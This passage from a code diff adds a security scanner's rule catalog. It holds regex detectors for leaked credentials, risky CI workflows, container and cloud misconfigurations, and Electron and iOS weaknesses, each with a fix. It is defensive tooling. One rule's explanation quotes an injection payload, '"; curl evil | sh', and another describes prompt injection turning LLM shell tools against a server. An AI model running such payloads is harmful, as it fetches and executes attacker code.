+  rule("API-INJ-08", "high", "backend", /\.(m?[jt]s|py|go|kt|java|cs|rb|php)$/, /(tools|functions)\s*[:=][\s\S]{0,400}(exec|shell|run_command|subprocess|child_process|eval)/, "LLM agent with shell or eval tools", "Prompt injection in any content the model reads can run commands on your server.", "Do not give models shell/eval tools; allowlist actions, sandbox execution, and require confirmation.", ["OWASP LLM01", "OWASP LLM06"], { when: /(anthropic|openai|ChatCompletion|messages\.create|chat\.completions|generateText|langchain)/i })
+];
+
+// src/security/catalog/common.ts
+var ROTATE = "Move it to a secret store or CI secret, load it at runtime, and rotate it: once committed or shipped it is compromised.";
+var COMMON = [
+  // ── Secrets in code and config
+  rule("COM-SEC-01", "critical", "common", F.text, /\bAKIA[0-9A-Z]{16}\b/, "AWS access key in the code", "An AWS access key id with its secret gives access to the AWS account.", ROTATE, ["CWE-798"], { secret: true }),
+  rule("COM-SEC-01", "critical", "common", F.text, /\b(sk|rk)_live_[0-9a-zA-Z]{16,}\b/, "Stripe live secret key in the code", "A live Stripe secret key can create charges, refunds and read customer data.", ROTATE, ["CWE-798"], { secret: true }),
+  rule("COM-SEC-01", "critical", "common", F.text, /\bsk-(proj-|ant-)?[A-Za-z0-9_-]{32,}\b/, "AI provider API key in the code", "OpenAI/Anthropic keys are billed to the owner and give access to their usage.", ROTATE, ["CWE-798"], { secret: true }),
+  rule("COM-SEC-01", "critical", "common", F.text, /\bgh[pousr]_[A-Za-z0-9]{36,}\b|\bgithub_pat_[A-Za-z0-9_]{50,}\b/, "GitHub token in the code", "A GitHub token gives access to repositories and can push code.", ROTATE, ["CWE-798"], { secret: true }),
+  rule("COM-SEC-01", "high", "common", F.text, /\bxox[abposr]-[A-Za-z0-9-]{10,}\b/, "Slack token in the code", "A Slack token reads and posts messages as the app or user.", ROTATE, ["CWE-798"], { secret: true }),
+  rule("COM-SEC-01", "high", "common", F.text, /https:\/\/hooks\.slack\.com\/services\/T[A-Z0-9]+\/B[A-Z0-9]+\/[A-Za-z0-9]+/, "Slack webhook URL in the code", "Anyone with the webhook URL can post into the channel.", ROTATE, ["CWE-798"], { secret: true }),
+  rule("COM-SEC-01", "high", "common", F.text, /\bSG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}\b/, "SendGrid API key in the code", "A SendGrid key sends email as the company (phishing from a trusted domain).", ROTATE, ["CWE-798"], { secret: true }),
+  rule("COM-SEC-01", "high", "common", F.text, /\b(AC|SK)[0-9a-f]{32}\b(?=[\s\S]{0,200}(auth|token|secret))/i, "Twilio credentials in the code", "Twilio credentials send SMS and calls billed to the owner.", ROTATE, ["CWE-798"], { secret: true }),
+  rule("COM-SEC-01", "critical", "common", F.text, /"type"\s*:\s*"service_account"[\s\S]{0,400}"private_key"/, "Google service-account key in the repo", "A service-account key acts as that account in Google Cloud with all its roles.", ROTATE, ["CWE-798"], { secret: true }),
+  rule("COM-SEC-01", "high", "common", F.text, /DefaultEndpointsProtocol=https?;AccountName=[^;]+;AccountKey=[A-Za-z0-9+/=]{40,}/, "Azure storage connection string in the code", "The account key gives full access to the storage account.", ROTATE, ["CWE-798"], { secret: true }),
+  rule("COM-SEC-01", "medium", "common", F.text, /\bAIza[0-9A-Za-z_-]{35}\b/, "Google API key in the code", "Google API keys without app/referrer restrictions can be used by anyone on your quota.", "Restrict the key to your app (package + SHA-1, bundle id or HTTP referrer) and the APIs it needs; move server-only keys off the client.", ["CWE-798"], { secret: true }),
+  rule("COM-SEC-01", "high", "common", F.text, /\b(postgres(ql)?|mysql|mongodb(\+srv)?|redis|amqps?):\/\/[^\s:'"@/]+:[^\s'"@/]{3,}@[^\s'"]+/, "Database URL with a password in the code", "The connection string carries a real password for the database.", ROTATE, ["CWE-798"], { secret: true }),
+  rule("COM-SEC-02", "critical", "common", F.text, /-----BEGIN (RSA |EC |DSA |OPENSSH |ENCRYPTED |PGP )?PRIVATE KEY( BLOCK)?-----/, "Private key in the repo", "A private key in the repo lets anyone with read access sign or decrypt as its owner.", ROTATE, ["CWE-321"], { secret: true }),
+  rule("COM-SEC-02", "critical", "common", /\.(jks|keystore|p12|pfx|p8|pem|key|mobileprovision)$/, void 0, "Key or signing file committed", "Signing keys and certificates in git are readable by everyone with repo access, forever (history).", "Remove it from the repo and its history (git filter-repo), rotate it, and keep it in a secret store or CI secret file. Add the extension to .gitignore.", ["CWE-522"], { fileOnly: true, tests: true }),
+  rule("COM-SEC-03", "high", "common", /(^|\/)\.env(\.(local|production|prod|staging|development|dev))?$|(^|\/)secrets?\.(properties|ya?ml|json)$/, void 0, "Environment or secrets file committed", "Env and secrets files usually hold real credentials; in git they reach everyone with repo access.", "Stop tracking it (git rm --cached), add it to .gitignore, commit an .env.example with placeholders, and rotate what was in it.", ["CWE-538"], { fileOnly: true }),
+  rule("COM-SEC-04", "medium", "common", F.text, /\b(password|passwd|pwd|secret|api[_-]?key|apikey|access[_-]?token|auth[_-]?token|client[_-]?secret|private[_-]?key)\b["']?\s*[:=]\s*["'][^"'\s$<>{}]{12,}["']/i, "Hard-coded credential", "A literal credential in code ends up in every copy of the repo and every build.", ROTATE, ["CWE-798"], { secret: true, unless: /\b(example|placeholder|changeme|dummy|your[_-]|xxx+)\b/i }),
+  rule("COM-SEC-07", "info", "common", F.text, /\b\w*PROD\w*\s*[:=]\s*["']?pk_test_/i, "Test key in a production setting", "A test key in a production variable means production payments do not work as intended, or the setting is mislabelled.", "Use the live publishable key for production builds, injected by CI.", [], { secret: true }),
+  // ── Repository hygiene
+  rule("COM-SEC-06", "low", "common", /(^|\/)\.gitignore$/, /(^|\n)\s*\.env\b/, ".gitignore does not ignore .env files", "Without an ignore rule, the next `git add .` commits real credentials.", "Add `.env*` (and `!.env.example`) to .gitignore.", ["CWE-538"], { absent: true }),
+  rule("COM-REP-03", "high", "common", /\.(sql|dump|bak|har|sqlite|db)$/, void 0, "Database dump, backup or HAR file committed", "Dumps and HAR captures usually contain real user data, sessions and tokens.", "Remove it from the repo and its history; keep test data synthetic.", ["CWE-538"], { fileOnly: true, unless: /^\s*$/ }),
+  rule("COM-REP-04", "info", "common", F.anyCode, /\/\/\s*(TODO|FIXME|HACK|XXX)\b[^\n]{0,80}\b(auth|security|csrf|xss|sanitiz|validat|encrypt|password|token|permission)/i, "Open security TODO", "Someone marked a known security gap here.", "Resolve the TODO or track it as an issue with an owner.", []),
+  // ── CI/CD
+  rule("COM-CI-01", "critical", "ci", F.ghActions, /pull_request_target[\s\S]*ref:\s*\$\{\{\s*github\.event\.pull_request\.head\.(sha|ref)/, "pull_request_target checks out untrusted PR code", "Fork PR code runs with the repository's secrets and a write token.", "Use `pull_request` for building PR code, or never check out the PR head in a pull_request_target job.", ["CWE-829"]),
+  rule("COM-CI-02", "high", "ci", F.ghActions, /run:[^\n]*\$\{\{\s*github\.event\.(issue\.title|issue\.body|pull_request\.title|pull_request\.body|comment\.body|review\.body|head_commit\.message|pull_request\.head\.ref)/, "Untrusted event text interpolated into a shell step", 'A PR title or comment like `"; curl evil | sh` runs as code in the workflow.', 'Pass the value through `env:` and use "$VAR" in the script.', ["CWE-78"]),
+  rule("COM-CI-03", "medium", "ci", F.ghActions, /uses:\s*(?!actions\/|github\/|\.\/)[\w.-]+\/[\w./-]+@(v?\d+(\.\d+)*|main|master|latest)\s*$/m, "Third-party action not pinned to a commit", "A moved tag or compromised action runs arbitrary code with your secrets.", "Pin third-party actions to a full commit SHA (keep the version in a comment).", ["CWE-829"]),
+  rule("COM-CI-04", "medium", "ci", F.ghActions, /^permissions:/m, "Workflow has no permissions block", "Without `permissions:`, GITHUB_TOKEN may get write access to the repo.", "Add `permissions: contents: read` at the top and widen per job only where needed.", ["CWE-250"], { absent: true, when: /^on:/m }),
+  rule("COM-CI-04", "medium", "ci", F.ghActions, /permissions:\s*write-all/, "Workflow token has write-all", "Every step, including third-party actions, can push, release and change settings.", "Grant only the scopes each job needs.", ["CWE-250"]),
+  rule("COM-CI-05", "high", "ci", /\.(ya?ml)$/, /(echo|printf|Write-Host)\s+[^\n]*\$\{?\{?\s*(secrets\.|\$?[A-Z_]*(TOKEN|SECRET|PASSWORD|API_KEY))/, "Secret printed in a CI step", "CI logs are often readable by everyone with repo access and kept for months.", "Never print secrets; pass them via env and mask them.", ["CWE-532"], { when: /(jobs:|stages:|script:)/ }),
+  rule("COM-CI-06", "high", "ci", F.ghActions, /runs-on:\s*\[?\s*self-hosted/, "Self-hosted runner", "If fork PRs can run here, anyone can run code on your machine and read what it holds.", "Use self-hosted runners only for private repos or protected branches, and make them ephemeral.", ["CWE-250"], { when: /pull_request/ }),
+  rule("COM-CI-01", "high", "ci", F.gitlabCi, /(\$CI_MERGE_REQUEST|merge_request_event|gh-pr-|external_pull_request)/, "CI runs untrusted merge-request code", "Pipelines for fork or PR refs can read variables that are not protected.", "Mark secret variables protected and masked, and run secret-bearing jobs only on protected refs.", ["CWE-829"], { when: /(TOKEN|SECRET|PASSWORD|KEY)/ }),
+  // ── Containers and infrastructure as code
+  rule("COM-IAC-01", "medium", "docker", F.dockerfile, /^\s*USER\s+(?!root\b|0\b)\S+/m, "Container runs as root", "A compromise of the app (or a dependency) gets root inside the container, which makes escapes easier.", "Add a non-root user and `USER app` before the entrypoint.", ["CWE-250"], { absent: true, when: /^\s*FROM\s/m }),
+  rule("COM-IAC-02", "low", "docker", F.dockerfile, /^\s*FROM\s+(?!scratch\b)[^\s@]+(:latest)?\s*(AS\s+\S+)?\s*$/im, "Base image not pinned by digest", "A floating tag changes under you: unreviewed code in every build, and builds that are not reproducible.", "Pin the base image by digest: `FROM image:tag@sha256:\u2026`.", ["CWE-829"]),
+  rule("COM-IAC-03", "high", "docker", F.dockerfile, /^\s*(ARG|ENV)\s+\w*(PASSWORD|SECRET|TOKEN|API_KEY|PRIVATE_KEY)\w*\s*=?\s*\S+/im, "Secret baked into the image", "ARG/ENV values stay in the image layers and its history, readable by anyone who pulls it.", "Use build secrets (`RUN --mount=type=secret`) or runtime env from a secret store.", ["CWE-538"], { secret: true }),
+  rule("COM-IAC-03", "high", "docker", F.dockerfile, /^\s*(COPY|ADD)\s+[^\n]*\.env\b/im, ".env copied into the image", "The image then carries the credentials to every registry and host it reaches.", "Do not copy env files; pass configuration at runtime. Add .env to .dockerignore.", ["CWE-538"]),
+  rule("COM-IAC-04", "high", "docker", F.compose, /^\s*-\s*["']?(0\.0\.0\.0:)?(5432|3306|27017|6379|9200|5672|11211):\d+/m, "Database port published to every interface", "Anyone on the network can reach the database directly, often with default credentials.", "Bind to 127.0.0.1 (`127.0.0.1:5432:5432`) or do not publish it.", ["CWE-1188"]),
+  rule("COM-IAC-05", "high", "iac", /\.(ya?ml)$/, /^\s*privileged:\s*true/m, "Privileged container", "A privileged container is root on the host.", "Remove `privileged`; add only the capabilities it needs.", ["CWE-250"]),
+  rule("COM-IAC-05", "high", "iac", /\.(ya?ml)$/, /\/var\/run\/docker\.sock/, "Docker socket mounted into a container", "Access to the Docker socket is root on the host.", "Do not mount the socket; use a scoped API or rootless builder.", ["CWE-250"]),
+  rule("COM-IAC-05", "medium", "iac", F.k8s, /^\s*(hostNetwork|hostPID|hostIPC|allowPrivilegeEscalation):\s*true/m, "Pod shares host namespaces or can escalate", "The pod can see or affect the node and other pods.", "Set these to false and use a restricted Pod Security profile.", ["CWE-250"]),
+  rule("COM-IAC-06", "critical", "iac", F.terraform, /acl\s*=\s*"public-read(-write)?"|block_public_(acls|policy)\s*=\s*false/, "Public storage bucket", "Everything in the bucket is readable (or writable) by anyone on the internet.", "Make the bucket private and serve public files through a CDN with an origin access identity.", ["CWE-284"]),
+  rule("COM-IAC-07", "high", "iac", F.terraform, /cidr_blocks\s*=\s*\[\s*"0\.0\.0\.0\/0"\s*\][\s\S]{0,200}(from_port|to_port)\s*=\s*(22|3389|3306|5432|27017|6379)\b|(from_port|to_port)\s*=\s*(22|3389|3306|5432|27017|6379)\b[\s\S]{0,200}cidr_blocks\s*=\s*\[\s*"0\.0\.0\.0\/0"/, "Admin or database port open to the internet", "SSH/RDP/database ports open to 0.0.0.0/0 are scanned and brute-forced constantly.", "Restrict the CIDR to a VPN or bastion range.", ["CWE-284"]),
+  rule("COM-IAC-08", "medium", "iac", F.terraform, /(storage_encrypted|encrypted)\s*=\s*false/, "Storage encryption turned off", "Disks, snapshots and backups are readable by anyone who gets them.", "Turn encryption on (KMS key).", ["CWE-311"]),
+  rule("COM-IAC-09", "high", "iac", /\.(tf|json|ya?ml)$/, /"Action"\s*:\s*"\*"[\s\S]{0,120}"Resource"\s*:\s*"\*"|actions\s*=\s*\[\s*"\*"\s*\]/, "IAM policy allows everything", "A wildcard policy turns any leak of this role into full account access.", "List the actions and resources the role needs.", ["CWE-250"]),
+  rule("COM-IAC-10", "high", "iac", F.k8s, /^kind:\s*Secret\b[\s\S]*^(data|stringData):\s*\n\s+\w+:\s*\S{8,}/m, "Kubernetes Secret with values committed", "Base64 is not encryption; the values are readable by everyone with repo access.", "Use Sealed Secrets, SOPS or an external secrets operator.", ["CWE-538"], { secret: true })
+];
+
+// src/security/catalog/desktop.ts
+var DESKTOP = [
+  // ── Electron
+  rule("DSK-EL-01", "critical", "electron", F.js, /nodeIntegration(InWorker|InSubFrames)?\s*:\s*true/, "Node integration in a renderer", "Any XSS or loaded page gets full Node.js: remote code execution on the user's machine.", "Set nodeIntegration: false and expose a minimal API through a preload + contextBridge.", ["CWE-94"]),
+  rule("DSK-EL-02", "critical", "electron", F.js, /contextIsolation\s*:\s*false/, "Context isolation off", "Page scripts can reach the preload's privileged objects.", "Set contextIsolation: true (the default).", ["CWE-653"]),
+  rule("DSK-EL-03", "high", "electron", F.js, /sandbox\s*:\s*false/, "Renderer sandbox off", "A renderer compromise reaches the OS directly.", "Keep sandbox: true.", ["CWE-653"]),
+  rule("DSK-EL-04", "high", "electron", F.js, /webSecurity\s*:\s*false|allowRunningInsecureContent\s*:\s*true|experimentalFeatures\s*:\s*true/, "Web security turned off", "Same-origin policy or mixed-content protection is disabled in the window.", "Remove these options.", ["CWE-693"]),
+  rule("DSK-EL-05", "high", "electron", F.js, /exposeInMainWorld\s*\([^)]*\{[\s\S]{0,400}(ipcRenderer\s*[,}]|ipcRenderer\.(send|invoke)\s*\(\s*\w+\s*,|require\s*[,:]|\bfs\b|child_process|shell\s*[,:])/, "Preload exposes raw IPC or Node modules", "Page scripts can send any IPC message or touch the file system.", "Expose one function per action with fixed channel names and validated arguments.", ["CWE-749"]),
+  rule("DSK-EL-06", "high", "electron", F.js, /ipcMain\.(handle|on)\s*\([^)]*,\s*(async\s*)?\(\s*\w+\s*,\s*\w+[^)]*\)\s*=>[\s\S]{0,300}(fs\.\w+|exec|spawn|shell\.|require\()/, "IPC handler touches files or processes with renderer input", "A compromised renderer drives file or process access.", "Validate arguments and event.senderFrame.url in each handler.", ["CWE-20"], { unless: /senderFrame|validate|schema\.parse|zod/ }),
+  rule("DSK-EL-07", "high", "electron", F.js, /shell\.openExternal\s*\(\s*(?!["'`]https:)/, "openExternal with a dynamic URL", "file:, smb: or custom-scheme URLs can run programs.", "Allow only https: (new URL(u).protocol === 'https:').", ["CWE-78"], { unless: /protocol\s*===?\s*["']https:/ }),
+  rule("DSK-EL-08", "medium", "electron", F.js, /new\s+BrowserWindow\s*\(/, "Window navigation not restricted", "A link or redirect can take the privileged window to another site.", "Handle will-navigate and setWindowOpenHandler to block or open externally.", ["CWE-939"], { unless: /will-navigate|setWindowOpenHandler/ }),
+  rule("DSK-EL-09", "high", "electron", F.js, /\.loadURL\s*\(\s*["'`]http:\/\/(?!localhost|127\.0\.0\.1)/, "Window loads a remote HTTP page", "Anyone on the network can replace the page that runs with app privileges.", "Ship local content, or load HTTPS pages in a window without preload privileges.", ["CWE-829"]),
+  rule("DSK-EL-09", "high", "electron", F.js, /webviewTag\s*:\s*true/, "<webview> tag enabled", "Webviews can be created with their own preferences by page content.", "Remove webviewTag; use BrowserView/WebContentsView.", ["CWE-829"]),
+  rule("DSK-EL-11", "high", "electron", F.js, /enableRemoteModule\s*:\s*true|require\s*\(\s*["']@electron\/remote/, "Remote module used", "The renderer gets proxies to main-process objects.", "Replace with explicit IPC.", []),
+  rule("DSK-EL-12", "high", "electron", F.js, /protocol\.(registerFileProtocol|handle)\s*\([^)]*\)[\s\S]{0,300}path\.join\s*\([^)]*request\.url/, "Custom protocol serves paths from the URL", "../ in the URL reads any file.", "Normalise and check the path stays inside the app folder.", ["CWE-22"]),
+  rule("DSK-EL-15", "low", "electron", F.js, /\.openDevTools\s*\(/, "DevTools opened unconditionally", "Users (or attackers at the keyboard) get a console with app privileges.", "Open DevTools only when !app.isPackaged.", ["CWE-489"], { unless: /isPackaged|isDev|NODE_ENV/ }),
+  rule("DSK-EL-13", "high", "electron", F.packageJson, /"electron"\s*:\s*"[~^]?([1-9]|[12]\d)\./, "Unsupported Electron version", "Old Electron ships Chromium with known exploited bugs.", "Upgrade to a supported Electron major.", ["CWE-1104"]),
+  rule("DSK-EL-10", "medium", "electron", /\.html$/, /Content-Security-Policy/, "Renderer page without CSP", "XSS in an Electron page is much worse than on the web.", "Add a strict CSP meta tag.", ["CWE-693"], { absent: true, when: /<script/ }),
+  // ── Tauri
+  rule("DSK-TA-01", "high", "tauri", /(capabilities\/.+\.json|tauri\.conf\.json)$/, /"(fs:allow-[\w-]+|fs:scope)"[\s\S]{0,200}"\$HOME\/\*\*"|"path"\s*:\s*"\$HOME\/\*\*"|"shell:allow-execute"|"shell:allow-spawn"/, "Tauri capability too broad", "The frontend can reach the whole home folder or run programs.", "Scope fs to the app data folder and drop shell execute unless a fixed command needs it.", ["CWE-250"]),
+  rule("DSK-TA-03", "medium", "tauri", /tauri\.conf\.json$/, /"csp"\s*:\s*null/, "Tauri CSP disabled", "XSS in the frontend reaches Tauri commands.", "Set a strict CSP.", ["CWE-693"]),
+  rule("DSK-TA-04", "high", "tauri", /(capabilities\/.+\.json|tauri\.conf\.json)$/, /"remote"\s*:\s*\{\s*"urls"\s*:\s*\[/, "Remote URLs get Tauri IPC", "A remote page (or anyone who controls it) can call your commands.", "Give remote origins no capabilities.", ["CWE-829"]),
+  rule("DSK-TA-02", "high", "tauri", /\.rs$/, /#\[tauri::command\][\s\S]{0,400}(std::fs::|Command::new|std::process)/, "Tauri command touches files or processes", "Arguments from the frontend decide what is read, written or run.", "Validate every argument; restrict paths to app folders.", ["CWE-20"], { unless: /canonicalize|starts_with|validate/ }),
+  // ── Native desktop
+  rule("DSK-NT-02", "critical", "common", /\.(xml|plist|json|m?[jt]s|cs|swift)$/, /(SUFeedURL|feedURL|updateUrl|autoUpdater\.setFeedURL)[^\n]*http:\/\//i, "Auto-update over HTTP", "Anyone on the network can serve an update: code execution on every machine.", "Use HTTPS and signed updates (Sparkle EdDSA, electron-updater with code signing).", ["CWE-494"]),
+  rule("DSK-NT-08", "medium", "common", F.entitlements, /com\.apple\.security\.cs\.(disable-library-validation|allow-unsigned-executable-memory|allow-dyld-environment-variables)<\/key>\s*<true/, "Hardened runtime weakened", "Other code can be injected into the app process.", "Remove these entitlements unless a plugin system needs them.", ["CWE-693"]),
+  rule("DSK-NT-05", "high", "common", /\.(m?[jt]s|py|go|cs|rs)$/, /\.listen\s*\(\s*\d+\s*,\s*["']0\.0\.0\.0["']|ListenAndServe\s*\(\s*":\d+"|host\s*=\s*["']0\.0\.0\.0["']/, "Local service listens on every interface", "Other machines on the network can call it.", "Bind to 127.0.0.1 and require a token.", ["CWE-306"], { when: /(electron|tauri|desktop|tray|app\.whenReady|NSApplication|WinForms|wpf)/i }),
+  rule("DSK-NT-03", "high", "common", F.cs, /LoadLibrary\s*\(\s*"(?![A-Za-z]:\\)[^"\\/]+\.dll"\s*\)|\[DllImport\s*\(\s*"(?![A-Za-z]:)[^"\\/]+"\s*\)\]/, "DLL loaded by bare name", "A DLL planted next to the app or in the current folder is loaded instead (DLL hijacking).", "Use full paths or SetDefaultDllDirectories(LOAD_LIBRARY_SEARCH_SYSTEM32).", ["CWE-427"], { unless: /SetDefaultDllDirectories|DefaultDllImportSearchPaths/ }),
+  rule("DSK-NT-09", "medium", "common", F.anyCode, /\/tmp\/[\w.-]+\.(json|txt|db|key|token)["']|Path\.GetTempPath\(\)\s*\+\s*"[\w.-]+"|tempfile\.mktemp\s*\(/, "Predictable temp file", "Another local user can read or replace it first.", "Use mkstemp / Path.GetTempFileName / fs.mkdtemp with restrictive permissions.", ["CWE-377"]),
+  rule("DSK-NT-10", "medium", "common", /\.(c|cc|cpp|cxx)$/, /\b(strcpy|strcat|sprintf|gets|vsprintf)\s*\(/, "Unsafe C string function", "These overflow on long input.", "Use bounded variants and length checks.", ["CWE-120"])
+];
+
+// src/security/catalog/ios.ts
+var IOS = [
+  // ── Info.plist and entitlements
+  rule("IOS-CFG-01", "high", "ios", F.plist, /<key>NSAllowsArbitraryLoads<\/key>\s*<true\s*\/>/, "App Transport Security disabled", "The app may load any URL over plain HTTP; traffic can be read and changed on the network.", "Remove NSAllowsArbitraryLoads; add NSExceptionDomains only for hosts that cannot do HTTPS.", ["CWE-319", "MASVS-NETWORK"]),
+  rule("IOS-CFG-01", "medium", "ios", F.plist, /<key>NSAllowsArbitraryLoadsInWebContent<\/key>\s*<true\s*\/>/, "ATS disabled for web content", "WebViews load any HTTP page, open to tampering.", "Remove it and load HTTPS content.", ["CWE-319"]),
+  rule("IOS-CFG-02", "medium", "ios", F.plist, /<key>NSExceptionAllowsInsecureHTTPLoads<\/key>\s*<true\s*\/>|<key>NSExceptionMinimumTLSVersion<\/key>\s*<string>TLSv1\.[01]<\/string>/, "ATS exception allows HTTP or old TLS", "Traffic to that domain is not protected properly.", "Move the host to HTTPS with TLS 1.2+ and drop the exception.", ["CWE-319"]),
+  rule("IOS-CFG-03", "medium", "ios", F.entitlements, /<key>get-task-allow<\/key>\s*<true\s*\/>/, "get-task-allow in entitlements", "Debuggers can attach to the app; it must not be in App Store builds.", "Let Xcode set it for Debug only; remove it from committed entitlements.", ["CWE-489"]),
+  rule("IOS-CFG-07", "medium", "ios", /\.(swift|m)$/, /#if\s+DEBUG[\s\S]{0,40}#else[\s\S]{0,200}(staging|dev\.|test\.|localhost)/i, "Release build points at a test environment", "The #else (release) branch uses a staging or test host.", "Use production hosts in release; inject environments by build configuration.", []),
+  rule("IOS-CFG-06", "low", "ios", F.plist, /<key>UIBackgroundModes<\/key>\s*<array>[\s\S]*?<string>(location|voip)<\/string>/, "Sensitive background mode", "Background location or VoIP need a clear feature; App Review rejects unused ones and they drain privacy.", "Remove modes no feature needs.", ["MASVS-PRIVACY"]),
+  // ── URL schemes, universal links, extensions
+  rule("IOS-LNK-01", "high", "ios", F.plist, /<key>CFBundleURLSchemes<\/key>\s*<array>\s*<string>(?!fb\d|com\.googleusercontent)[^<]+<\/string>/, "Custom URL scheme", "Any app can register the same scheme; OAuth codes, reset tokens or magic links sent to it can be stolen.", "Use universal links (associated domains) for sensitive flows and PKCE for OAuth.", ["CWE-939"]),
+  rule("IOS-LNK-02", "high", "ios", F.swift, /(func\s+application\s*\([^)]*open\s+url|\.onOpenURL\s*\{|openURLContexts)[\s\S]{0,600}(load|navigate|push|present|open|perform)/, "URL handler acts on link parameters", "Any website or app can open this link with chosen parameters.", "Validate host, path and every parameter against an allowlist, and confirm state-changing actions with the user.", ["CWE-20"], { unless: /allowedHosts|allowlist|whitelist|guard\s+url\.host\s*==/ }),
+  rule("IOS-LNK-05", "medium", "ios", F.swift, /sourceApplication|UIApplication\.OpenURLOptionsKey\.sourceApplication/, "Security decision on the calling app", "The source application is not a reliable identity.", "Do not trust sourceApplication for authorisation.", ["CWE-290"]),
+  rule("IOS-LNK-08", "low", "ios", F.swiftObjc, /UIPasteboard\.general\.(string|setValue|items)\s*=?[^\n]*(token|password|otp|secret|key)/i, "Secret on the general pasteboard", "Other apps (and Universal Clipboard devices) can read it.", "Avoid it; or set localOnly and an expiration date.", ["CWE-200"]),
+  rule("IOS-LNK-07", "low", "ios", F.swift, /isSecureTextEntry\s*=\s*true/, "Third-party keyboards allowed", "Custom keyboards can log what the user types in other fields.", "In sensitive apps implement application(_:shouldAllowExtensionPointIdentifier:) to refuse .keyboard.", [], { unless: /shouldAllowExtensionPointIdentifier/, when: /AppDelegate/ }),
+  // ── WebViews
+  rule("IOS-WEB-01", "medium", "ios", F.swiftObjc, /\bUIWebView\b/, "UIWebView used", "UIWebView is deprecated, cannot turn JavaScript off and is rejected by the App Store.", "Move to WKWebView.", []),
+  rule("IOS-WEB-02", "high", "ios", F.swift, /func\s+userContentController\s*\([^)]*didReceive\s+message/, "JS bridge handles messages from any origin", "Any page loaded in the WebView can call the native handler.", "Check message.frameInfo.securityOrigin.host against an allowlist (and isMainFrame) before acting.", ["CWE-749"], { unless: /securityOrigin/ }),
+  rule("IOS-WEB-03", "high", "ios", F.swift, /decidePolicyFor\s+navigationAction[\s\S]{0,400}decisionHandler\s*\(\s*\.allow\s*\)/, "WebView allows every navigation", "Redirects and injected links keep the user (and the bridge) on attacker pages.", "Allow only known hosts; open others in Safari.", ["CWE-939"], { unless: /host\s*==|allowedHosts|allowlist/ }),
+  rule("IOS-WEB-04", "high", "ios", F.swiftObjc, /allowFileAccessFromFileURLs|allowUniversalAccessFromFileURLs/, "WebView file URLs can read other files", "A file:// page can read app files and send them out.", "Remove the private setting; load local content with loadFileURL scoped to one folder.", ["CWE-200"]),
+  rule("IOS-WEB-04", "medium", "ios", F.swift, /loadFileURL\s*\([^)]*allowingReadAccessTo\s*:\s*(URL\s*\(\s*fileURLWithPath\s*:\s*"\/"|FileManager\.default\.urls\(for:\s*\.documentDirectory)/, "WebView can read the whole Documents folder", "With any XSS in the page, all app documents can be read.", "Grant read access to the page's own folder only.", ["CWE-200"]),
+  rule("IOS-WEB-05", "critical", "ios", F.swift, /didReceive\s+challenge[\s\S]{0,500}\.useCredential\s*,\s*URLCredential\s*\(\s*trust\s*:/, "TLS challenge accepted without evaluation", "Accepting any server trust lets a network attacker read and change traffic.", "Call SecTrustEvaluateWithError (or default handling) and only then useCredential; better: no custom handling at all.", ["CWE-295"], { unless: /SecTrustEvaluateWithError|SecTrustEvaluate\(|pinned|pinning/i }),
+  rule("IOS-WEB-06", "high", "ios", F.swift, /evaluateJavaScript\s*\(\s*"[^"]*\\\(/, "JavaScript built from interpolated strings", "Untrusted values in the string run as code in the page.", "Use callAsyncJavaScript with arguments, or JSON-encode values.", ["CWE-79"]),
+  rule("IOS-WEB-07", "low", "ios", F.swift, /isInspectable\s*=\s*true/, "WebView inspectable in release", "Safari Web Inspector can read and drive it on any device.", "Wrap in #if DEBUG.", ["CWE-489"], { unless: /#if\s+DEBUG/ }),
+  // ── Storage
+  rule("IOS-STO-01", "critical", "ios", F.swiftObjc, /(UserDefaults\.standard\.set|@AppStorage\s*\(|NSUserDefaults\s+standardUserDefaults\]\s+setObject)[^\n]*(token|password|secret|jwt|session|apiKey|credential)/i, "Secret in UserDefaults", "UserDefaults is a plain plist in the app container and in backups.", "Store secrets in the Keychain (kSecAttrAccessibleWhenUnlockedThisDeviceOnly).", ["CWE-312"]),
+  rule("IOS-STO-02", "medium", "ios", F.swiftObjc, /kSecAttrAccessibleAlways(ThisDeviceOnly)?\b/, "Keychain item always accessible", "The item can be read while the device is locked (deprecated).", "Use kSecAttrAccessibleWhenUnlockedThisDeviceOnly (or AfterFirstUnlockThisDeviceOnly for background use).", ["MASVS-STORAGE"]),
+  rule("IOS-STO-02", "low", "ios", F.swiftObjc, /kSecAttrAccessibleAfterFirstUnlock\b(?!ThisDeviceOnly)/, "Keychain item migrates to other devices", "Without ThisDeviceOnly the item moves to new devices through backups.", "Use the ThisDeviceOnly variant for tokens and keys.", ["MASVS-STORAGE"]),
+  rule("IOS-STO-03", "medium", "ios", F.swift, /\.write\s*\(\s*to\s*:[^)]*options\s*:\s*\[?\s*\.(noFileProtection|completeFileProtectionNone)/, "File written without data protection", "The file is readable whenever the device is on, even locked.", "Use .completeFileProtection (or .completeFileProtectionUnlessOpen).", ["CWE-311"]),
+  rule("IOS-STO-04", "high", "ios", F.swift, /NSPersistentContainer\s*\(|Realm\s*\(\s*\)|try\s+Realm\s*\(/, "Local database without encryption", "Core Data / Realm files are readable from backups and the container.", "If it holds personal data or tokens, enable Realm encryptionKey (from the Keychain) or file protection for Core Data stores (NSPersistentStoreFileProtectionKey).", ["CWE-312"], { unless: /encryptionKey|NSPersistentStoreFileProtectionKey|FileProtectionType\.complete/ }),
+  rule("IOS-STO-07", "low", "ios", F.swift, /(password|otp|pin|secret)\w*(Field|TextField)\s*\.\s*isSecureTextEntry\s*=\s*false/i, "Secret field shown in clear text", "The keyboard cache and screenshots can capture it.", "Keep isSecureTextEntry = true for secrets.", []),
+  rule("IOS-STO-08", "low", "ios", F.swift, /func\s+sceneDidEnterBackground|func\s+applicationDidEnterBackground/, "No privacy overlay when backgrounding", "The app switcher snapshot shows whatever was on screen.", "Add a blur/cover view in sceneWillResignActive for sensitive screens.", ["MASVS-PLATFORM"], { unless: /blur|UIVisualEffectView|privacy|snapshot|cover/i }),
+  // ── Crypto
+  rule("IOS-CRY-01", "critical", "ios", F.swift, /SymmetricKey\s*\(\s*data\s*:\s*("[^"]+"|Data\s*\(\s*"[^"]+")|let\s+\w*(key|secret|salt)\w*\s*=\s*"[A-Za-z0-9+/=]{16,}"/i, "Hard-coded key", "The key ships in the binary; anyone can extract it.", "Generate keys at runtime and store them in the Keychain / Secure Enclave.", ["CWE-321"], { secret: true }),
+  rule("IOS-CRY-02", "high", "ios", F.swiftObjc, /kCCOptionECBMode/, "ECB mode", "ECB leaks plaintext patterns and has no integrity.", "Use CryptoKit AES.GCM.", ["CWE-327"]),
